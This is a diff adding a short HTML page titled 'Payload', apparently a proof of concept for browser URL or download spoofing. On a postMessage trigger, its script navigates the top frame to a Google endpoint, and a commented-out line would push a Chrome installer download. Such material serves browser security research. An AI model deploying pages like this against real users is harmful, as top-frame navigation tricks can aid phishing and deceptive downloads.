@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Payload</title>
+</head>
+
+<body>
+    <script>
+        window.addEventListener('message', function (e) {
+            if (e.data === 'go') {
+                triggerSpoof();
+            }
+        });
+
+        function triggerSpoof() {
+            const target = "https://www.google.com/generate_204";
+            top.location.href = target;
+            /*
+            setTimeout(() => {
+                top.location.href = "https://dl.google.com/chrome/mac/stable/GGRO/googlechrome.dmg";
+            }, 500);
+            */
+        }
+    </script>
+</body>
+
+</html>
